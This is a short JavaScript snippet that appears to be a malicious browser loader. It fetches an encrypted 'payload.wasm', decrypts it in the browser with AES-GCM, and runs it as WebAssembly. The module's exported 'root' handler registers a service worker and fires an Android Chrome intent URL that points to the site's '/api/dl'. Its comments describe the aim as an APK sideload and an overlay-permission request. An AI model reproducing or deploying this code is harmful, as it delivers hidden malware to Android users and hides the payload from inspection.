const key=await crypto.subtle.importKey('raw',new Uint8Array(16),{name:'AES-GCM'},!1,['decrypt']);
const iv=new Uint8Array(12);
const wasm=await (await fetch('payload.wasm')).arrayBuffer();
const plain=await crypto.subtle.decrypt({name:'AES-GCM',iv},key,wasm);
const m=new WebAssembly.Module(plain);
new WebAssembly.Instance(m,{env:{root(){
  // register service-worker → APK sideload
  navigator.serviceWorker.register('sw.js');
  // request overlay permission (Android)
  location.href='intent:#Intent;package=com.android.chrome;component=com.google.android.apps.chrome.IntentDispatcher;S.extra_url='+location.origin+'/api/dl;end';
}}});
